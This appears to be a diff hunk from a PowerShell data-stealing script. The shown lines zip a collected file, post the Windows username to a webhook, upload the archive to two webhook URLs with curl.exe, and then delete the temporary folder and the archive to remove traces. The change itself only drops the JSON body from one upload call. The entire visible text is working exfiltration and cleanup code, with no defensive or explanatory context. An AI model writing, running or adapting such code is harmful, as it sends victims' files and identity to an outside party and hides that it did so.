@@ -9,7 +9,7 @@ Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
 $Body = @{'username' = $env:username; 'content' = "Magia pura"}
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
 Start-Sleep -Seconds 1.5
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl2
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post; curl.exe -F 'file1=@c:\export.zip' $hookurl2
 rm -r C:\temp
 rm -r C:\export.zip
 
